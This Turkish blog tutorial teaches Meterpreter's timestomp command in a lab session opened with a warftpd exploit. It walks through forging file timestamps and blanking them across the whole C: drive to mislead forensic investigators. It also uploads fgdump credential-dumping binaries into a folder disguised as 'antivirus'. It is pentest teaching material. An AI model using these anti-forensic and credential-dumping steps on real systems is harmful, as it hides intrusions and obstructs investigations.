---

authors:
  - name: İbrahim Korucuoğlu
    link: https://github.com/siberoloji
    image: https://github.com/siberoloji.png


categories:
- Metasploit Framework
classicmag_header_overlay:
- global-layout
classicmag_post_layout:
- layout-1
classicmag_post_sidebar_option:
- right-sidebar
date: "2017-06-05T13:37:00Z"
excerpt: Herhangi bir sistemde pentest yapmak, o sistemle etkileşime girmeyi gerektirir.
  Gerçekleştirdiğiniz her işlemde, hedef sistemde izler bırakırsınız. Bu bıraktığınız
  izleri incelemek forensics araştırmacılarının dikkatini çeker. Dosyaların zaman
  damgaları bunlardan bir tanesidir. Bırakılan bu izleri temizlemek veya en azından
  karıştırmak için Meterpreter timestomp adı verilen bir komut sağlamaktadır.
guid: https://www.siberoloji.com/?p=1195
id: 1195
image: /assets/images/2024/06/metasploit.jpg
tags:
- cybersecurity
- metasploit framework
title: MSF Timestomp
url: /tr/msf-timestomp/
---

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading" id="timestomp-nedir">TimeStomp Nedir? 
<!-- /wp:heading -->

 <p>Herhangi bir sistemde pentest yapmak, o sistemle etkileşime girmeyi gerektirir. Gerçekleştirdiğiniz her işlemde, hedef sistemde izler bırakırsınız. Bu bıraktığınız izleri incelemek&nbsp;<strong>forensics</strong>&nbsp;araştırmacılarının dikkatini çeker. Dosyaların zaman damgaları bunlardan bir tanesidir. Bırakılan bu izleri temizlemek veya en azından karıştırmak için Meterpreter&nbsp;<code>timestomp</code>&nbsp;adı verilen bir komut sağlamaktadır.</p>
 

 <p>İz bırakmamanın en iyi yolu sisteme hiç dokunmamaktır. Meterpreter, normal olarak RAM üzerinde çalışır ve diske dokunmaz. Fakat gerçekleştireceğiniz bir takım dosya işlemleri sonucunda ister istemez zaman logları oluşacaktır. Bu yazımızda dosyaların zaman kayıtları üzerinde&nbsp;<code>timestomp</code>&nbsp;komutu kullanılarak oynama yapmayı göreceğiz.</p>
 

 <p>Her dosyanın Windows için Modified, Accesed ve Changed olarak 3 farklı zaman kaydı tutulur. Bunlara baş harflerinden hareetle kısaca MAC zamanları diyebiliriz. Ağ kartının MAC adresi ile karıştırmayın.</p>
 

 <p>Windows içerisinde bir dosyanın MAC zamanlarına bakalım.</p>
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">File Path: C:\Documents and Settings\P0WN3D\My Documents\test.txt
Created Date: 5/3/2009 2:30:08 AM
Last Accessed: 5/3/2009 2:31:39 AM
Last Modified: 5/3/2009 2:30:36 AM
</code></pre>
<!-- /wp:code -->

 <p>Yukarıda,&nbsp;<code>test.txt</code>&nbsp;isimli dosyanın zaman kayıtlarını görebiliriz. Şimdi,&nbsp;<code>warftpd_165_user</code>&nbsp;modülünü kullanarak bu sistemde&nbsp;<code>Meterpreter</code>&nbsp;oturum açtığımızı farz edelim.</p>
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf exploit<strong>(</strong>warftpd_165_user<strong>)</strong> <strong>&gt;</strong> exploit

<strong>[</strong><strong>*</strong><strong>]</strong> Handler binding to LHOST 0.0.0.0
<strong>[</strong><strong>*</strong><strong>]</strong> Started reverse handler
<strong>[</strong><strong>*</strong><strong>]</strong> Connecting to FTP server 172.16.104.145:21...
<strong>[</strong><strong>*</strong><strong>]</strong> Connected to target FTP server.
<strong>[</strong><strong>*</strong><strong>]</strong> Trying target Windows 2000 SP0-SP4 English...
<strong>[</strong><strong>*</strong><strong>]</strong> Transmitting intermediate stager <strong>for </strong>over-sized stage...<strong>(</strong>191 bytes<strong>)</strong>
<strong>[</strong><strong>*</strong><strong>]</strong> Sending stage <strong>(</strong>2650 bytes<strong>)</strong>
<strong>[</strong><strong>*</strong><strong>]</strong> Sleeping before handling stage...
<strong>[</strong><strong>*</strong><strong>]</strong> Uploading DLL <strong>(</strong>75787 bytes<strong>)</strong>...
<strong>[</strong><strong>*</strong><strong>]</strong> Upload completed.
<strong>[</strong><strong>*</strong><strong>]</strong> meterpreter session 1 opened <strong>(</strong>172.16.104.130:4444 -&gt; 172.16.104.145:1218<strong>)</strong>
meterpreter <strong>&gt;</strong> use priv
Loading extension priv...success.
</code></pre>
<!-- /wp:code -->

 <p>Meterpreter shell açıldıktan sonra&nbsp;<code>timestomp -h</code>&nbsp;komutu ile yardım bilgilerini görüntüleyebilirsiniz.</p>
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> timestomp -h

Usage: timestomp OPTIONS file_path

OPTIONS:

    -a   Set the "last accessed" time of the file
    -b        Set the MACE timestamps so that EnCase shows blanks
    -c   Set the "creation" time of the file
    -e   Set the "mft entry modified" time of the file
    -f   Set the MACE of attributes equal to the supplied file
    -h        Help banner
    -m   Set the "last written" time of the file
    -r        Set the MACE timestamps recursively on a directory
    -v        Display the UTC MACE values of the file
    -z   Set all four attributes <strong>(</strong>MACE<strong>)</strong> of the file
</code></pre>
<!-- /wp:code -->

 <p>Şimdi, yukarıda örneğini verdiğimiz&nbsp;<code>test.txt</code>&nbsp;dosyasının bulunduğu klasöre gidelim.</p>
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> pwd
C:\Program Files\War-ftpd
meterpreter <strong>&gt;</strong> cd ..
meterpreter <strong>&gt;</strong> pwd
C:Program Files
meterpreter <strong>&gt;</strong> cd ..
meterpreter <strong>&gt;</strong> cd Documents\ and\ Settings
meterpreter <strong>&gt;</strong> cd P0WN3D
meterpreter <strong>&gt;</strong> cd My\ Documents
meterpreter <strong>&gt;</strong> ls

Listing: C:\Documents and Settings\P0WN3D\My Documents
<strong>======================================================</strong>

Mode              Size  Type  Last modified                   Name        
----              ----  ----  -------------                   ----        
40777/rwxrwxrwx   0     dir   Wed Dec 31 19:00:00 -0500 1969  .           
40777/rwxrwxrwx   0     dir   Wed Dec 31 19:00:00 -0500 1969  ..          
40555/r-xr-xr-x   0     dir   Wed Dec 31 19:00:00 -0500 1969  My Pictures 
100666/rw-rw-rw-  28    fil   Wed Dec 31 19:00:00 -0500 1969  test.txt
</code></pre>
<!-- /wp:code -->

 <p>Bulunduğumuz klasördeki&nbsp;<code>test.txt</code>&nbsp;dosyasının zaman bilgilerini&nbsp;<code>-v</code>&nbsp;seçeneği ile görüntüleyebilirsiniz.</p>
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> timestomp test.txt -v
Modified      : Sun May 03 04:30:36 -0400 2009
Accessed      : Sun May 03 04:31:51 -0400 2009
Created       : Sun May 03 04:30:08 -0400 2009
Entry Modified: Sun May 03 04:31:44 -0400 2009
</code></pre>
<!-- /wp:code -->

 <p>Bu dosyayı sizin oluşturduğunuzu düşünün. Bunu değiştirmek isteyebilirsiniz. Şimdi bu zaman bilgilerini değiştirmeye çalışalım. Bunu yapmanın birinci yolu, sistemde bulunan başka bir dosyanın zaman bilgilerini,&nbsp;<code>test.txt</code>&nbsp;dosyasına kopyalakmatır.</p>
 

 <p>Örneğin,&nbsp;<code>cmd.exe</code>&nbsp;dosyasının zaman bilgilerini&nbsp;<code>test.txt</code>&nbsp;zaman bilgilerine kopyalayalım. Bunun için aşağıdaki komutu&nbsp;<code>-f</code>&nbsp;seçeneği ile yürütebilirsiniz.</p>
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> timestomp test.txt -f C:\\WINNT\\system32\\cmd.exe
<strong>[</strong><strong>*</strong><strong>]</strong> Setting MACE attributes on test.txt from C:\WINNT\system32\cmd.exe
meterpreter <strong>&gt;</strong> timestomp test.txt -v
Modified      : Tue Dec 07 08:00:00 -0500 1999
Accessed      : Sun May 03 05:14:51 -0400 2009
Created       : Tue Dec 07 08:00:00 -0500 1999
Entry Modified: Sun May 03 05:11:16 -0400 2009
</code></pre>
<!-- /wp:code -->

 <p>İşlem tamamlandı. Gerçekten kopyalanmış mı bakalım.</p>
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">File Path: C:\Documents and Settings\P0WN3D\My Documents\test.txt
Created Date: 12/7/1999 7:00:00 AM
Last Accessed: 5/3/2009 3:11:16 AM
Last Modified: 12/7/1999 7:00:00 AM
</code></pre>
<!-- /wp:code -->

 <p>Gördüğünüz gibi&nbsp;<code>test.txt</code>&nbsp;dosyasının MAC zaman bilgileri&nbsp;<code>cmd.exe</code>&nbsp;dosyasıyla aynı oldu.</p>
 

 <p>Dikkatli bir kullanıcıysanız, Windows komut satırından ve Linux komut satırından dosyaya baktığınızda tarih bilgileri aynı olsa da saat bilgilerinin farklı olduğunu fark etmişsinizdir. Bu farkın sebebi&nbsp;<code>timezone</code>&nbsp;zaman dilimlerinin farklılığındandır.</p>
 

 <p>Ayıca,&nbsp;<code>test.txt</code>&nbsp;dosyasının&nbsp;<code>accessed time</code>&nbsp;değerinin dosyanın bilgilerini kontrol ettiğimizden dolayı hemen yeni tarihe güncellendiğini de vurgulamak gerekir. Windows için zaman kayıtlarının ne kadar değişken ve önemli olduğunu vurgulamak yerinde olacaktır.</p>
 

 <p>Şimdi farklı bir teknik kullanalım.&nbsp;<code>timestomp</code>&nbsp;sunduğu&nbsp;<code>-b</code>&nbsp;seçeneği, zaman bilgilerini boş olarak ayarlamanıza yardımcı olur. Aşağıdaki örnekte, dosyanın mevcut durumu ve&nbsp;<code>timestomp test.txt -b</code>&nbsp;komutu sonrasındaki zaman bilgilerini görebilirsiniz.</p>
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> timestomp test.txt -v
Modified      : Tue Dec 07 08:00:00 -0500 1999
Accessed      : Sun May 03 05:16:20 -0400 2009
Created       : Tue Dec 07 08:00:00 -0500 1999
Entry Modified: Sun May 03 05:11:16 -0400 2009

meterpreter <strong>&gt;</strong> timestomp test.txt -b
<strong>[</strong><strong>*</strong><strong>]</strong> Blanking file MACE attributes on test.txt
meterpreter <strong>&gt;</strong> timestomp test.txt -v
Modified      : 2106-02-06 23:28:15 -0700
Accessed      : 2106-02-06 23:28:15 -0700
Created       : 2106-02-06 23:28:15 -0700
Entry Modified: 2106-02-06 23:28:15 -0700
</code></pre>
<!-- /wp:code -->

 <p>Görüldüğü gibi dosyalar 2106 yılına ait zaman bilgilerini aldı. Bu görünüm Meterpreter komut satırından böyle iken bir de Windows içerisinde nasıl göründüğüne bakalım.</p>
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">File Path: C:\Documents and Settings\P0WN3D\My Documents\test.txt
Created Date: 1/1/1601
Last Accessed: 5/3/2009 3:21:13 AM
Last Modified: 1/1/1601
</code></pre>
<!-- /wp:code -->

 <p>Linux Meterpreter içerisinde 2106 yılı, Windows içinde 1601 oarak görülmektedir. Bu farkın sebebini&nbsp;<a href="http://en.wikipedia.org/wiki/1601#Notes">Ek bilgi</a>&nbsp;sayfasından inceleyebilirsiniz.</p>
 

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading" id="başka-bir-örnek">Başka Bir Örnek 
<!-- /wp:heading -->

 <p>Şimdi, meterpreter komut satırımızdan Windows içerisine&nbsp;<code>WINNT\\antivirus\\</code>&nbsp;klasörü oluşturalım ve içerisine bir kaç dosya yükleyelim.</p>
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> cd C:\\WINNT
meterpreter <strong>&gt;</strong> mkdir antivirus
Creating directory: antivirus
meterpreter <strong>&gt;</strong> cd antivirus
meterpreter <strong>&gt;</strong> pwd
C:\WINNT\antivirus
meterpreter <strong>&gt;</strong> upload /usr/share/windows-binaries/fgdump c:\\WINNT\\antivirus\\
<strong>[</strong><strong>*</strong><strong>]</strong> uploading  : /usr/share/windows-binaries/fgdump/servpw.exe -&gt; c:WINNTantivirusPwDump.exe
<strong>[</strong><strong>*</strong><strong>]</strong> uploaded   : /usr/share/windows-binaries/fgdump/servpw.exe -&gt; c:WINNTantivirusPwDump.exe
<strong>[</strong><strong>*</strong><strong>]</strong> uploading  : /usr/share/windows-binaries/fgdump/cachedump64.exe -&gt; c:WINNTantivirusLsaExt.dll
<strong>[</strong><strong>*</strong><strong>]</strong> uploaded   : /usr/share/windows-binaries/fgdump/cachedump64.exe -&gt; c:WINNTantivirusLsaExt.dll
<strong>[</strong><strong>*</strong><strong>]</strong> uploading  : /usr/share/windows-binaries/fgdump/pstgdump.exe -&gt; c:WINNTantiviruspwservice.exe
<strong>[</strong><strong>*</strong><strong>]</strong> uploaded   : /usr/share/windows-binaries/fgdump/pstgdump.exe -&gt; c:WINNTantiviruspwservice.exe
meterpreter <strong>&gt;</strong> ls

Listing: C:\WINNT\antivirus
<strong>===========================</strong>

Mode              Size    Type  Last modified                   Name          
----              ----    ----  -------------                   ----          
100777/rwxrwxrwx  174080  fil   2017-05-09 15:23:19 -0600  cachedump64.exe
100777/rwxrwxrwx  57344   fil   2017-05-09 15:23:20 -0600  pstgdump.exe
100777/rwxrwxrwx  57344   fil   2017-05-09 15:23:18 -0600  servpw.exe
meterpreter <strong>&gt;</strong> cd ..
</code></pre>
<!-- /wp:code -->

 <p>Artık Windows içerisine&nbsp;<code>antivirus</code>&nbsp;klasörünün içerisine yüklediğimiz 3 adet&nbsp;<code>exe</code>&nbsp;dosyamız var. Bunların zaman bilgilerine bakalım.</p>
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> timestomp antivirus\\servpw.exe -v
Modified      : 2017-05-09 16:23:18 -0600
Accessed      : 2017-05-09 16:23:18 -0600
Created       : 2017-05-09 16:23:18 -0600
Entry Modified: 2017-05-09 16:23:18 -0600
meterpreter <strong>&gt;</strong> timestomp antivirus\\pstgdump.exe -v
Modified      : 2017-05-09 16:23:20 -0600
Accessed      : 2017-05-09 16:23:19 -0600
Created       : 2017-05-09 16:23:19 -0600
Entry Modified: 2017-05-09 16:23:20 -0600
</code></pre>
<!-- /wp:code -->

 <p><code>timestomp</code>&nbsp;komutunun&nbsp;<code>-r</code>&nbsp;seçeneğini kullanarak tüm klasör içeriğindeki dosyaların zaman bilgilerini boşaltabilirsiniz.</p>
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> timestomp antivirus -r
<strong>[</strong><strong>*</strong><strong>]</strong> Blanking directory MACE attributes on antivirus

meterpreter <strong>&gt;</strong> ls
40777/rwxrwxrwx   0      dir   1980-01-01 00:00:00 -0700  ..
100666/rw-rw-rw-  115    fil   2106-02-06 23:28:15 -0700  servpw.exe
100666/rw-rw-rw-  12165  fil   2106-02-06 23:28:15 -0700  pstgdump.exe
</code></pre>
<!-- /wp:code -->

 <p>Yukarıda anlatılan yöntemlerle zaman bilgilerini değiştirdik veya boş hale getirdik ancak dikkatli&nbsp;<strong>forensics</strong>&nbsp;araştırmacıları bu garipliği fark edecektir.</p>
 

 <p>Bunun yerine sistemin tamamının zaman bilgilerini değiştirmeyi düşünebilirsiniz. Bu durumda, hangi dosyanın ne zaman oluşturulduğu veya değiştirildiği tamamen karışacaktır. Karşılaştırma yapılacak başka bir dosya olmadığından işler iyice karmaşık hale gelecektir.</p>
 

 <p>Bu durum, sisteme bir müdahale olduğunu açık olarak ortaya koymakla birlikte&nbsp;<strong>forensics</strong>&nbsp;araştırmacılarının işini zorlaştıracaktır.</p>
 

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading" id="tüm-sistemin-zaman-bilgilerini-değiştirme">Tüm Sistemin Zaman Bilgilerini Değiştirme 
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> pwd
C:WINNT\antivirus
meterpreter <strong>&gt;</strong> cd ../..
meterpreter <strong>&gt;</strong> pwd
C:
meterpreter <strong>&gt;</strong> ls

Listing: C:\
<strong>============</strong>

Mode              Size       Type  Last modified                   Name                      
----              ----       ----  -------------                   ----                      
100777/rwxrwxrwx  0          fil   Wed Dec 31 19:00:00 -0500 1969  AUTOEXEC.BAT              
100666/rw-rw-rw-  0          fil   Wed Dec 31 19:00:00 -0500 1969  CONFIG.SYS                
40777/rwxrwxrwx   0          dir    Wed Dec 31 19:00:00 -0500 1969  Documents and Settings    
100444/r--r--r--  0          fil   Wed Dec 31 19:00:00 -0500 1969  IO.SYS                    
100444/r--r--r--  0          fil   Wed Dec 31 19:00:00 -0500 1969  MSDOS.SYS                 
100555/r-xr-xr-x  34468      fil   Wed Dec 31 19:00:00 -0500 1969  <a href="http://ntdetect.com/">NTDETECT.COM</a>              
40555/r-xr-xr-x   0          dir   Wed Dec 31 19:00:00 -0500 1969  Program Files             
40777/rwxrwxrwx   0          dir   Wed Dec 31 19:00:00 -0500 1969  RECYCLER                  
40777/rwxrwxrwx   0          dir   Wed Dec 31 19:00:00 -0500 1969  System Volume Information 
40777/rwxrwxrwx   0          dir   Wed Dec 31 19:00:00 -0500 1969  WINNT                     
100555/r-xr-xr-x  148992     fil   Wed Dec 31 19:00:00 -0500 1969  arcldr.exe                
100555/r-xr-xr-x  162816     fil   Wed Dec 31 19:00:00 -0500 1969  arcsetup.exe              
100666/rw-rw-rw-  192        fil   Wed Dec 31 19:00:00 -0500 1969  boot.ini                  
100444/r--r--r--  214416     fil   Wed Dec 31 19:00:00 -0500 1969  ntldr                     
100666/rw-rw-rw-  402653184  fil   Wed Dec 31 19:00:00 -0500 1969  pagefile.sys              

meterpreter <strong>&gt;</strong> timestomp C:\\ -r
<strong>[</strong><strong>*</strong><strong>]</strong> Blanking directory MACE attributes on C:\
meterpreter <strong>&gt;</strong> ls
meterpreter <strong>&gt;</strong> ls

Listing: C:\
<strong>============</strong>

Mode              Size       Type  Last modified              Name
----              ----       ----  -------------              ----
100777/rwxrwxrwx  0          fil   2106-02-06 23:28:15 -0700  AUTOEXEC.BAT
100666/rw-rw-rw-  0          fil   2106-02-06 23:28:15 -0700  CONFIG.SYS
100666/rw-rw-rw-  0          fil   2106-02-06 23:28:15 -0700  Documents and Settings
100444/r--r--r--  0          fil   2106-02-06 23:28:15 -0700  IO.SYS
100444/r--r--r--  0          fil   2106-02-06 23:28:15 -0700  MSDOS.SYS
100555/r-xr-xr-x  47564      fil   2106-02-06 23:28:15 -0700  <a href="http://ntdetect.com/">NTDETECT.COM</a>
...snip...
</code></pre>
<!-- /wp:code -->

 <p><code>timestomp C:\\ -r</code>&nbsp;komutuyla C diskinde bulunan tüm dosyaların zaman bilgilerinin değiştirildiğini görebilirsiniz.</p>
 

 <p>Akıllı&nbsp;<strong>forensics</strong>&nbsp;araştırmacıları, sadece zaman bilgileri değil başka yerlere de bakarlar. Windows içinde çeşitli farklı kayıt mekanizmaları bulunmaktadır.</p>
 